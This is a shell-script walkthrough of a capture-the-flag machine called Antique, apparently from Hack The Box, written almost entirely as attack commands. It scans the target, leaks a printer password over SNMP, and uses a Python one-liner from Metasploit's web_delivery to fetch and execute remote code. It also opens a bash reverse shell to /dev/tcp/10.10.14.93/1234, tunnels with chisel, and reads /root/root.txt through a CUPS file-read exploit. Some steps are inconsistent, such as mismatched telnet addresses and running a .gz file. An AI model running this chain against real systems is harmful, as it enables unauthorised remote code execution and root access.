#!/bin/bash
# Antique is Linux machine
# scan tcp with nmap
nmap -p- -sV 10.129.33.36
# telent is open , we wiil exploit it 
# telnet 192.168.56.113
# search for exploit for the system target
searchsploit HP JetDirect
# he is find vuln about password
searchsploit -m 22319
cat 22319.txt
# SNMP Enumeration
nmap -sU -sV -p 161 10.129.33.36
# follwing the vuln that we found it (.1.3.6.1.4.1.11.2.3.9.1.1.13.0)
snmpget -v 1 -c public 10.129.33.36 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
#useing Cyberchef app the encod the number
telnet 192.168.56.113
# With obtained credentials using ? بيانات الاعتماد 
# --------------
# 
use multi/script/web_delivery
set lhost 10.10.14.93
set srvhost 10.10.14.93
exploit
python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.14.93:8080/CzrKiV54o7', context=ssl._create_unverified_context());exec(r.read());"
#---------------
#Privilege Escalation
# Port Forwarding with Metasploit
portfwd add -l 8082 -p 631 -r 127.0.0.1
# Exploit File read Vulnerability
use post/multi/escalate/cups_root_file_read
set session 1
set file /root/root.txt
exploit

# Manual Method
https://github.com/jpillora/chisel
gunzip chisel_1.7.7_linux_amd64.gz
python3 -m http.server 80

chmod 777 chisel_1.7.7_linux_amd64.gz
./ chisel_1.7.7_linux_amd64.gz server -p 5000 --reverse

telnet 10.129.33.36
exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
wget 10.10.14.93/chisel_1.7.7_linux_amd64

./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631
